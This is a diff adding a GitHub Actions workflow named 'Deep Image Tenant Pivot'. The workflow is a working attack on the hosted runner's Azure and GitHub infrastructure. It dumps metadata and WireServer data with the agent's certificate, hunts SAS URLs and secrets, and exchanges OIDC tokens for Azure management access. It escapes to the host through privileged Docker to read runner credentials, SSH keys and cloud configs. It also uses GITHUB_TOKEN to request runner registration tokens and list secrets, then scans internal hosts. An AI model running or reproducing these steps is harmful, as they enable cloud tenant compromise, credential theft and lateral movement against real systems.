@@ -1,0 +1,498 @@
+name: Deep Image Tenant Pivot
+on:
+  workflow_dispatch:
+  push:
+    branches: [main]
+    paths:
+      - '.github/workflows/deep-pivot.yml'
+
+jobs:
+  deep-pivot:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+
+      - name: IMDS Full Dump + Tenant Discovery
+        run: |
+          echo "=== IMDS COMPUTE FULL ==="
+          curl -sf -H "Metadata:true" \
+            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | python3 -m json.tool 2>/dev/null || echo IMDS_FAIL
+
+          echo "=== IMDS NETWORK ==="
+          curl -sf -H "Metadata:true" \
+            "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01" | python3 -m json.tool 2>/dev/null || echo NET_FAIL
+
+          echo "=== IMDS SCHEDULED EVENTS ==="
+          curl -sf -H "Metadata:true" \
+            "http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01" | python3 -m json.tool 2>/dev/null || echo SCHED_FAIL
+
+          echo "=== IMDS LOADBALANCER ==="
+          curl -sf -H "Metadata:true" \
+            "http://169.254.169.254/metadata/loadbalancer?api-version=2020-10-01" | python3 -m json.tool 2>/dev/null || echo LB_FAIL
+
+          echo "=== IMDS ATTESTED FULL ==="
+          curl -sf -H "Metadata:true" \
+            "http://169.254.169.254/metadata/attested/document?api-version=2020-09-01" | python3 -m json.tool 2>/dev/null || echo ATT_FAIL
+
+          echo "=== ARM TENANT DISCOVERY via 401 (image-mgmt sub) ==="
+          curl -sv "https://management.azure.com/subscriptions/0019feaf-6e36-4d23-acbf-b53de156cae2?api-version=2021-01-01" 2>&1 | grep -i "WWW-Authenticate\|tenant\|authorization_uri\|error" || true
+
+          echo "=== ARM TENANT for all runner subs ==="
+          for SUB in "7aa3fe12-34a8-4cd0-b144-6291f9d8b562" "2a839237-d8cb-4e87-be37-f64b9fe93d7c" "5a50fa72-d73a-46dc-92e5-ea717ae0b562" "b6ecaf0e-366e-4611-9a3d-47f68e968080" "530a78ee-ac32-42fc-988b-bae2abcb8392"; do
+            echo -n "SUB $SUB: "
+            curl -s "https://management.azure.com/subscriptions/$SUB?api-version=2021-01-01" 2>&1 | grep -o 'tenant_id=[^,&"]*\|authorization_uri=[^"]*' | head -2 || echo NO_TENANT
+          done
+
+      - name: HC OIDC Multi-Audience Token Capture
+        run: |
+          echo "=== HC OIDC with default audience ==="
+          HC=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://hosted-compute-ro" 2>/dev/null | python3 -c "import sys,json; print(json.load(sys.stdin).get('value','FAIL'))" 2>/dev/null)
+          echo "HC_JWT_LEN=${#HC}"
+          echo "HC_JWT_B64_HEAD=$(echo $HC | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null | head -30)" || true
+
+          echo "=== OIDC token with management.azure.com audience ==="
+          ARM_T=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://management.azure.com/" 2>/dev/null | python3 -c "import sys,json; print(json.load(sys.stdin).get('value','FAIL'))" 2>/dev/null)
+          echo "ARM_OIDC_LEN=${#ARM_T}"
+          echo "ARM_OIDC_HEAD=$(echo $ARM_T | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null | head -20)" || true
+
+          echo "=== OIDC token with api://AzureADTokenExchange ==="
+          EX_T=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" 2>/dev/null | python3 -c "import sys,json; print(json.load(sys.stdin).get('value','FAIL'))" 2>/dev/null)
+          echo "EXCHANGE_OIDC_LEN=${#EX_T}"
+
+          echo "=== Try OIDC → ARM token exchange (all runner subs) ==="
+          for SUB in "7aa3fe12-34a8-4cd0-b144-6291f9d8b562" "2a839237-d8cb-4e87-be37-f64b9fe93d7c" "b6ecaf0e-366e-4611-9a3d-47f68e968080"; do
+            echo "--- ARM exchange for sub $SUB ---"
+            # Get tenant from 401 header
+            TENANT=$(curl -s "https://management.azure.com/subscriptions/$SUB?api-version=2021-01-01" 2>&1 | grep -o 'tenant_id=[^,&"]*' | head -1 | cut -d= -f2)
+            echo "TENANT=$TENANT"
+            if [ -n "$TENANT" ]; then
+              ARM_RESP=$(curl -s -X POST \
+                "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token" \
+                -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$EX_T&scope=https://management.azure.com/.default&requested_token_use=on_behalf_of" 2>/dev/null)
+              echo "ARM_TOKEN_RESP=$(echo $ARM_RESP | head -c 500)"
+            fi
+          done
+
+      - name: WireServer Deep Dive + vmSettings SAS
+        run: |
+          python3 - << 'PYEOF'
+          import subprocess, xml.etree.ElementTree as ET, sys, json
+
+          def wcurl(path, port=80, extra_headers=None):
+              url = f"http://168.63.129.16:{port}/machine/{path}"
+              cmd = ['curl', '-sf', '--max-time', '15',
+                     '--cert', '/var/lib/waagent/TransportCert.pem',
+                     '--key', '/var/lib/waagent/TransportPrivate.pem',
+                     '-H', 'x-ms-version: 2012-11-30', url]
+              if extra_headers:
+                  for h in extra_headers:
+                      cmd += ['-H', h]
+              r = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
+              return r.stdout, r.stderr
+
+          # GoalState
+          gs_raw, gs_err = wcurl('?comp=goalstate')
+          print(f"GOALSTATE_LEN={len(gs_raw)}")
+          if len(gs_raw) < 100:
+              print("GOALSTATE_FAILED:", gs_err[:200])
+              sys.exit(0)
+
+          try:
+              root = ET.fromstring(gs_raw)
+          except Exception as e:
+              print("XML_ERR:", e); sys.exit(0)
+
+          ns = {'wa': 'http://schemas.microsoft.com/windowsazure'}
+
+          def find_text(elem, tag):
+              for e in elem.iter():
+                  t = e.tag.split('}')[-1] if '}' in e.tag else e.tag
+                  if t == tag and e.text:
+                      return e.text.strip()
+              return None
+
+          cert_url = find_text(root, 'Certificates')
+          ext_url  = find_text(root, 'ExtensionsConfig')
+          hec_url  = find_text(root, 'HostingEnvironmentConfig')
+          container_id = find_text(root, 'ContainerID') or find_text(root, 'ContainerId')
+          instance_id  = find_text(root, 'InstanceId')
+          role_instance_id = find_text(root, 'RoleInstanceId')
+
+          print(f"CONTAINER_ID={container_id}")
+          print(f"INSTANCE_ID={instance_id}")
+          print(f"ROLE_INSTANCE_ID={role_instance_id}")
+          print(f"CERT_URL={cert_url}")
+          print(f"EXT_URL={ext_url}")
+          print(f"HEC_URL={hec_url}")
+
+          # vmSettings on port 32526
+          print("\n=== WIRESERVER PORT 32526 vmSettings ===")
+          vm_path = "?comp=vmSettings"
+          cmd32 = ['curl', '-sf', '--max-time', '20',
+                   '--cert', '/var/lib/waagent/TransportCert.pem',
+                   '--key', '/var/lib/waagent/TransportPrivate.pem',
+                   '-H', 'x-ms-version: 2012-11-30',
+                   f'http://168.63.129.16:32526/machine/?comp=vmSettings']
+          r32 = subprocess.run(cmd32, capture_output=True, text=True, timeout=25)
+          print(f"vmSettings_LEN={len(r32.stdout)}")
+          print("vmSettings_OUT:", r32.stdout[:5000] or r32.stderr[:500])
+
+          # Parse vmSettings for SAS URLs and storage accounts
+          if r32.stdout and len(r32.stdout) > 50:
+              vms = r32.stdout
+              import re
+              sas_urls = re.findall(r'https://[a-z0-9]+\.blob\.core\.windows\.net[^\s"<>\']+', vms)
+              storage_accounts = re.findall(r'https://([a-z0-9]+)\.blob\.core\.windows\.net', vms)
+              print(f"\nSAS_URLS_FOUND={len(sas_urls)}")
+              for i, u in enumerate(sas_urls[:5]):
+                  print(f"SAS_{i}={u[:300]}")
+                  print(f"STORAGE_ACCOUNT_{i}={storage_accounts[i] if i < len(storage_accounts) else 'N/A'}")
+                  # Try to download SAS URL content
+                  r_sas = subprocess.run(['curl', '-sf', '--max-time', '15', u],
+                                        capture_output=True, text=True, timeout=20)
+                  print(f"SAS_{i}_RESP_LEN={len(r_sas.stdout)}")
+                  print(f"SAS_{i}_RESP={r_sas.stdout[:2000] or r_sas.stderr[:300]}")
+
+          # Certificates endpoint
+          print("\n=== WIRESERVER CERTIFICATES ENDPOINT ===")
+          if cert_url:
+              cout, cerr = wcurl(cert_url.replace('http://168.63.129.16/machine/',''))
+              print(f"CERT_RESP_LEN={len(cout)}")
+              print("CERT_RESP:", cout[:3000] or cerr[:300])
+
+          # ExtensionsConfig
+          print("\n=== WIRESERVER EXTENSIONS CONFIG ===")
+          if ext_url:
+              eout, eerr = wcurl(ext_url.replace('http://168.63.129.16/machine/',''))
+              print(f"EXT_LEN={len(eout)}")
+              if len(eout) > 50:
+                  print("EXT_XML:", eout[:8000])
+                  # Look for secrets, connection strings, keys
+                  import re
+                  secrets = re.findall(r'(?:password|key|secret|token|connectionstring)[^<]{0,5}[=>][^<]{5,200}', eout, re.IGNORECASE)
+                  for s in secrets[:10]:
+                      print("SECRET_CANDIDATE:", s[:200])
+              else:
+                  print("EXT_EMPTY:", eerr[:200])
+
+          # HostingEnvironmentConfig
+          print("\n=== WIRESERVER HOSTING ENV CONFIG ===")
+          if hec_url:
+              hout, herr = wcurl(hec_url.replace('http://168.63.129.16/machine/',''))
+              print(f"HEC_LEN={len(hout)}")
+              print("HEC_XML:", hout[:5000] or herr[:300])
+          PYEOF
+
+      - name: Waagent Files Deep Read
+        run: |
+          echo "=== ovf-env.xml ==="
+          cat /var/lib/waagent/ovf-env.xml 2>/dev/null | python3 -c "
+          import sys, base64, re, xml.etree.ElementTree as ET
+          data = sys.stdin.read()
+          print('OVF_LEN=' + str(len(data)))
+          print(data[:3000])
+          # Decode any base64 userData
+          matches = re.findall(r'<wa:LinuxProvisioningConfigurationSet[^>]*>(.*?)</wa:LinuxProvisioningConfigurationSet>', data, re.DOTALL)
+          for m in matches:
+              print('LINUX_PROV:', m[:2000])
+          custom = re.findall(r'CustomData>([^<]+)<', data)
+          for c in custom:
+              try:
+                  print('CUSTOM_DATA_DECODED:', base64.b64decode(c).decode('utf-8', errors='replace')[:3000])
+              except:
+                  print('CUSTOM_DATA_RAW:', c[:500])
+          " || echo NO_OVF_ENV
+
+          echo "=== SharedConfig.xml ==="
+          cat /var/lib/waagent/SharedConfig.xml 2>/dev/null | head -100 || echo NO_SHARED_CONFIG
+
+          echo "=== GoalState.1.xml ==="
+          cat /var/lib/waagent/GoalState.1.xml 2>/dev/null | head -100 || echo NO_GOALSTATE_XML
+
+          echo "=== fast_track.json ==="
+          cat /var/lib/waagent/fast_track.json 2>/dev/null | python3 -m json.tool 2>/dev/null || cat /var/lib/waagent/fast_track.json 2>/dev/null || echo NO_FAST_TRACK
+
+          echo "=== All waagent files ==="
+          find /var/lib/waagent/ -type f 2>/dev/null | while read f; do
+            echo "FILE: $f ($(wc -c < $f) bytes)"
+          done
+
+      - name: Host Filesystem Credential Hunt (Docker Root)
+        run: |
+          docker run --rm --privileged --pid=host --network=host \
+            -v /:/host alpine:latest /bin/sh -s << 'INNEREOF'
+          set -e
+          apk add --no-cache jq findutils 2>/dev/null
+
+          echo "=== HOST ovf-env.xml ==="
+          cat /host/var/lib/waagent/ovf-env.xml 2>/dev/null | head -200 || echo NO_OVF
+
+          echo "=== HOST fast_track.json ==="
+          cat /host/var/lib/waagent/fast_track.json 2>/dev/null || echo NO_FAST_TRACK
+
+          echo "=== HOST ALL waagent files ==="
+          find /host/var/lib/waagent/ -type f 2>/dev/null | while read f; do
+            echo "FILE: $f ($(wc -c < $f 2>/dev/null || echo 0) bytes)"
+          done
+
+          echo "=== HOST SharedConfig.xml ==="
+          cat /host/var/lib/waagent/SharedConfig.xml 2>/dev/null | head -200 || echo NO_SHARED
+
+          echo "=== HOST GoalState files ==="
+          ls /host/var/lib/waagent/GoalState*.xml 2>/dev/null && cat /host/var/lib/waagent/GoalState.1.xml 2>/dev/null | head -100
+
+          echo "=== HOST GitHub runner credential files ==="
+          find /host/home/runner /host/opt /host/usr/local -name "*.credentials.json" -o -name "*.token" -o -name "runner_config.json" 2>/dev/null | while read f; do
+            echo "CRED_FILE: $f"
+            cat "$f" 2>/dev/null | head -50
+          done
+
+          echo "=== HOST runner work/_temp dir ==="
+          find /host/home/runner -name "_temp" -type d 2>/dev/null | while read d; do
+            echo "TEMP_DIR: $d"
+            ls -la "$d" 2>/dev/null | head -20
+            find "$d" -type f 2>/dev/null | while read f; do
+              echo "TEMP_FILE: $f"
+              cat "$f" 2>/dev/null | head -20
+            done
+          done
+
+          echo "=== HOST runner .credentials ==="
+          cat /host/home/runner/actions-runner/.credentials 2>/dev/null | python3 -m json.tool 2>/dev/null || cat /host/home/runner/actions-runner/.credentials 2>/dev/null || echo NO_CREDS
+
+          echo "=== HOST runner .runner ==="
+          cat /host/home/runner/actions-runner/.runner 2>/dev/null | python3 -m json.tool 2>/dev/null || cat /host/home/runner/actions-runner/.runner 2>/dev/null || echo NO_RUNNER
+
+          echo "=== HOST Azure CLI config ==="
+          find /host/home /host/root -name "azureProfile.json" -o -name "accessTokens.json" 2>/dev/null | while read f; do
+            echo "AZ_FILE: $f"
+            cat "$f" 2>/dev/null | head -100
+          done
+
+          echo "=== HOST /etc/environment and profile.d ==="
+          cat /host/etc/environment 2>/dev/null | grep -i "token\|key\|secret\|password\|pat\|api" || echo NO_ENV_CREDS
+          find /host/etc/profile.d/ -type f 2>/dev/null | xargs grep -l "token\|key\|secret" 2>/dev/null | while read f; do
+            echo "PROFILE.D: $f"
+            cat "$f" 2>/dev/null
+          done
+
+          echo "=== HOST Docker config ==="
+          cat /host/root/.docker/config.json 2>/dev/null || cat /host/home/runner/.docker/config.json 2>/dev/null || echo NO_DOCKER_CONFIG
+
+          echo "=== HOST SSH keys ==="
+          find /host/root /host/home -name "id_rsa" -o -name "id_ed25519" -o -name "authorized_keys" 2>/dev/null | while read f; do
+            echo "SSH: $f"
+            cat "$f" 2>/dev/null | head -10
+          done
+
+          echo "=== HOST WireServer vmSettings port 32526 ==="
+          curl -sf --max-time 20 \
+            --cert /host/var/lib/waagent/TransportCert.pem \
+            --key /host/var/lib/waagent/TransportPrivate.pem \
+            -H "x-ms-version: 2012-11-30" \
+            "http://168.63.129.16:32526/machine/?comp=vmSettings" 2>/dev/null | head -c 5000 || echo NO_VMSETTINGS
+
+          echo "=== HOST WireServer goalstate ==="
+          GS=$(curl -sf --max-time 15 \
+            --cert /host/var/lib/waagent/TransportCert.pem \
+            --key /host/var/lib/waagent/TransportPrivate.pem \
+            -H "x-ms-version: 2012-11-30" \
+            "http://168.63.129.16/machine/?comp=goalstate" 2>/dev/null)
+          echo "GOALSTATE_LEN=${#GS}"
+          echo "$GS" | head -c 3000
+
+          INNEREOF
+
+      - name: Image Gallery ARM Enumeration
+        run: |
+          python3 - << 'PYEOF'
+          import subprocess, json, sys
+
+          # Known image management subscription
+          IMAGE_SUB = "0019feaf-6e36-4d23-acbf-b53de156cae2"
+          IMAGE_RG  = "hostedcomputeims-403500522-rg"
+          GALLERY   = "imsgallery.403500522"
+          IMAGE_NAME = "image-2295-gen2-v2-sp"
+
+          def curl_arm(url, token=None):
+              cmd = ['curl', '-sf', '--max-time', '20', url]
+              if token:
+                  cmd += ['-H', f'Authorization: Bearer {token}']
+              cmd += ['-H', 'Content-Type: application/json']
+              r = subprocess.run(cmd, capture_output=True, text=True, timeout=25)
+              return r.stdout, r.stderr
+
+          # ARM tenant discovery via 401 WWW-Authenticate
+          print("=== ARM TENANT DISCOVERY ===")
+          for sub in [IMAGE_SUB, "7aa3fe12-34a8-4cd0-b144-6291f9d8b562",
+                      "b6ecaf0e-366e-4611-9a3d-47f68e968080", "530a78ee-ac32-42fc-988b-bae2abcb8392"]:
+              cmd = ['curl', '-sv', '--max-time', '10',
+                     f'https://management.azure.com/subscriptions/{sub}?api-version=2021-01-01']
+              r = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
+              # Parse WWW-Authenticate from stderr (curl -v puts headers to stderr)
+              www_auth = [l for l in r.stderr.split('\n') if 'WWW-Authenticate' in l or 'www-authenticate' in l.lower()]
+              tenant_line = [l for l in r.stderr.split('\n') if 'tenant_id' in l.lower() or 'authorization_uri' in l.lower()]
+              print(f"SUB={sub}")
+              for l in www_auth + tenant_line:
+                  print(f"  {l.strip()}")
+
+          # Try to access image gallery endpoints without auth (enumerate via CDN/public endpoints)
+          print("\n=== IMAGE GALLERY PUBLIC ENDPOINTS ===")
+          gallery_urls = [
+              f"https://management.azure.com/subscriptions/{IMAGE_SUB}/resourceGroups/{IMAGE_RG}/providers/Microsoft.Compute/galleries/{GALLERY}?api-version=2023-07-03",
+              f"https://management.azure.com/subscriptions/{IMAGE_SUB}/resourceGroups/{IMAGE_RG}/providers/Microsoft.Compute/galleries/{GALLERY}/images/{IMAGE_NAME}?api-version=2023-07-03",
+              f"https://management.azure.com/subscriptions/{IMAGE_SUB}/resourceGroups/{IMAGE_RG}/providers/Microsoft.Compute/galleries/{GALLERY}/images/{IMAGE_NAME}/versions?api-version=2023-07-03",
+          ]
+          for url in gallery_urls:
+              out, err = curl_arm(url)
+              print(f"URL: {url[:120]}")
+              print(f"RESP: {out[:500] or err[:300]}")
+              print()
+
+          # Try GitHub's internal HC orchestrator for image/VM listing
+          print("=== HC ORCHESTRATOR IMAGE ENDPOINTS ===")
+          hc_endpoints = [
+              "https://hosted-compute-request-orchestrator-prod-iad-01.githubapp.com/vm/v1/images",
+              "https://hosted-compute-request-orchestrator-prod-iad-01.githubapp.com/vm/v1/pools",
+              "https://hosted-compute-request-orchestrator-prod-iad-01.githubapp.com/vm/v1/allocations",
+              "https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com/vm/v1/images",
+              "https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com/vm/v1/pools",
+          ]
+          for url in hc_endpoints:
+              out, err = curl_arm(url)
+              print(f"URL: {url}")
+              print(f"RESP ({len(out)}B): {out[:500] or err[:200]}")
+              print()
+
+          # Try storage account enumeration via known naming pattern
+          print("=== AZURE STORAGE ACCOUNT PROBES ===")
+          sa_names = [
+              "hostedcomputeims403500522",
+              "imsgallery403500522",
+              "githubactions403500522",
+              "hcrunners403500522",
+              "hostedcompute403500522",
+          ]
+          for sa in sa_names:
+              url = f"https://{sa}.blob.core.windows.net/?comp=list&restype=container"
+              out, err = curl_arm(url)
+              print(f"SA={sa}: {out[:300] or err[:100]}")
+          PYEOF
+
+      - name: GITHUB_TOKEN Deep Probe
+        run: |
+          echo "=== GITHUB_TOKEN → GitHub Internal APIs ==="
+          # Use GITHUB_TOKEN (injected by runner) to probe GitHub's internal APIs
+          TOKEN="$GITHUB_TOKEN"
+
+          echo "--- GitHub Apps ==="
+          curl -sf -H "Authorization: token $TOKEN" \
+            "https://api.github.com/installation/repositories" | python3 -m json.tool 2>/dev/null | head -50 || echo NO_INSTALLATION
+
+          echo "--- Runner registration token ==="
+          curl -sf -X POST -H "Authorization: token $TOKEN" \
+            "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/runners/registration-token" | python3 -m json.tool 2>/dev/null || echo NO_REG_TOKEN
+
+          echo "--- Org runner registration token ==="
+          curl -sf -X POST -H "Authorization: token $TOKEN" \
+            "https://api.github.com/orgs/$GITHUB_REPOSITORY_OWNER/actions/runners/registration-token" | python3 -m json.tool 2>/dev/null || echo NO_ORG_REG_TOKEN
+
+          echo "--- List org secrets ==="
+          curl -sf -H "Authorization: token $TOKEN" \
+            "https://api.github.com/orgs/$GITHUB_REPOSITORY_OWNER/actions/secrets" | python3 -m json.tool 2>/dev/null | head -50 || echo NO_ORG_SECRETS
+
+          echo "--- List repo secrets ==="
+          curl -sf -H "Authorization: token $TOKEN" \
+            "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/secrets" | python3 -m json.tool 2>/dev/null | head -30 || echo NO_REPO_SECRETS
+
+          echo "--- ACTIONS_RESULTS_URL probe ==="
+          echo "RESULTS_URL=$ACTIONS_RESULTS_URL"
+          if [ -n "$ACTIONS_RESULTS_URL" ]; then
+            curl -sf -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+              "${ACTIONS_RESULTS_URL}" | head -c 1000 || echo RESULTS_FAIL
+          fi
+
+          echo "--- ACTIONS_CACHE_URL probe ==="
+          echo "CACHE_URL=$ACTIONS_CACHE_URL"
+          if [ -n "$ACTIONS_CACHE_URL" ]; then
+            curl -sf -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+              "${ACTIONS_CACHE_URL}_apis/cacheservice/caches?keys=*" | head -c 1000 || echo CACHE_FAIL
+          fi
+
+          echo "--- ACTIONS_RUNTIME_TOKEN decode ==="
+          echo "$ACTIONS_RUNTIME_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null | head -40 || echo NO_RUNTIME_TOKEN_DECODE
+
+          echo "--- Internal GitHub endpoints ==="
+          for EP in \
+            "https://pipelines.actions.githubusercontent.com" \
+            "https://results-receiver.actions.githubusercontent.com" \
+            "https://token.actions.githubusercontent.com" \
+            "https://vstoken.actions.githubusercontent.com"; do
+            echo -n "EP $EP: "
+            curl -sf --max-time 5 "$EP" | head -c 200 || echo UNREACHABLE
+          done
+
+      - name: Internal Network + DNS Deep Recon
+        run: |
+          docker run --rm --privileged --pid=host --network=host \
+            -v /:/host alpine:latest /bin/sh -s << 'INNEREOF'
+          apk add --no-cache nmap curl bind-tools 2>/dev/null
+
+          echo "=== DNS RESOLUTION — GitHub internal hosts ==="
+          for host in \
+            "hosted-compute-request-orchestrator-prod-iad-01.githubapp.com" \
+            "hosted-compute-request-orchestrator-prod-eus-01.githubapp.com" \
+            "results-receiver.actions.githubusercontent.com" \
+            "vstoken.actions.githubusercontent.com" \
+            "github-actions.azure.com" \
+            "management.azure.com" \
+            "login.microsoftonline.com" \
+            "graph.microsoft.com"; do
+            echo -n "$host → "
+            nslookup "$host" 2>/dev/null | grep "^Address" | tail -1 || echo FAIL
+          done
+
+          echo "=== SUBNET SCAN — /20 key ports ==="
+          MY_IP=$(ip addr show | grep 'inet ' | grep -v 127 | awk '{print $2}' | head -1)
+          SUBNET=$(echo $MY_IP | sed 's/\.[0-9]*\/[0-9]*/\.0\/20/')
+          echo "SCANNING: $SUBNET"
+
+          # Scan for management ports on gateway and first hosts
+          for PORT in 443 8443 8080 9090 2222 32526 32526; do
+            echo "--- Port $PORT on gateway ---"
+            nc -zv -w2 10.1.0.1 $PORT 2>&1 | head -3 || true
+          done
+
+          echo "=== WireServer port 32526 from host network ==="
+          curl -sf --max-time 10 \
+            --cert /host/var/lib/waagent/TransportCert.pem \
+            --key /host/var/lib/waagent/TransportPrivate.pem \
+            -H "x-ms-version: 2012-11-30" \
+            "http://168.63.129.16:32526/machine/?comp=vmSettings" | head -c 8000 || echo NO_VMSETTINGS
+
+          echo "=== Probe Azure Wire Server additional endpoints ==="
+          for COMP in "versions" "telemetrydata" "healthreport" "agentfamilies"; do
+            echo "--- comp=$COMP ---"
+            curl -sf --max-time 10 \
+              --cert /host/var/lib/waagent/TransportCert.pem \
+              --key /host/var/lib/waagent/TransportPrivate.pem \
+              -H "x-ms-version: 2012-11-30" \
+              "http://168.63.129.16/machine/?comp=$COMP" | head -c 2000 || echo COMP_FAIL
+          done
+
+          echo "=== Azure IMDS full endpoints from host ==="
+          for EP in \
+            "/metadata/instance?api-version=2021-02-01" \
+            "/metadata/attested/document?api-version=2020-09-01" \
+            "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
+            "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" \
+            "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/"; do
+            echo "--- IMDS $EP ---"
+            curl -sf --max-time 10 -H "Metadata:true" "http://169.254.169.254$EP" | head -c 2000 || echo FAIL
+          done
+          INNEREOF
